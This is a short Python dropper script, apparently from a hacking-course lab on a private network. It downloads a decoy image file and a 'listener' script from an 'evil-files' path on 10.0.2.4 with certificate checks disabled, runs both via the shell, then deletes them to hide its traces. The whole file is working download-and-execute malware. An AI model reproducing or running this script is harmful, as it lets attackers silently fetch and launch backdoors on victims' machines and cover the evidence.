# download, execute, and report
import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url, verify=False)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output:
        output.write(get_response.content)
    return


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

FILE1 = "a10.JPG"
download(f"http://10.0.2.4/evil-files/{FILE1}")
subprocess.Popen(FILE1, shell=True) # Popen starts a separate process, no pause

FILE2 = "main.py" # listener script
download(f"http://10.0.2.4/evil-files/{FILE2}")
subprocess.call(FILE2, shell=True) # No separate process, scripts pauses here

os.remove(FILE1)
os.remove(FILE2)

print("Goodbye!")
